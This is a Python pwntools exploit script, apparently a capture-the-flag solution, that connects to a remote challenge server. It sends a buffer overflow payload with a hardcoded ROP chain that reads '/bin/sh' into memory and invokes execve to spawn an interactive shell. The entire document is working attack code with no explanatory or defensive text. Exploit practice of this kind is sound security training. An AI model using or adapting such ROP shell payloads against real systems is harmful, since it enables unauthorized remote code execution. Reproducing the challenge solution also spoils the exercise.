from pwn import *

r = remote('edu-ctf.zoolab.org',10003)
#r = process('./share/chal')
syscall_ret = 0x414506
pop_rdi_ret = 0x401e3f
pop_rsi_ret = 0x409e6e
pop_rdx_rbx_ret = 0x47ed0b
pop_rax_ret = 0x447b27
stack = 0x4c5000

payload = b''.ljust(0x28,b'\x00')
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_ret) + p64(stack)
payload += p64(pop_rdx_rbx_ret) + p64(0x100) + p64(0)
payload += p64(pop_rax_ret)  + p64(0)
payload += p64(syscall_ret)
payload += p64(pop_rdi_ret) + p64(stack)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_rbx_ret) + p64(0) + p64(0)
payload += p64(pop_rax_ret)  + p64(59) 
payload += p64(syscall_ret)
#input()
r.send(payload)
r.send(b'/bin/sh\x00')
r.interactive()
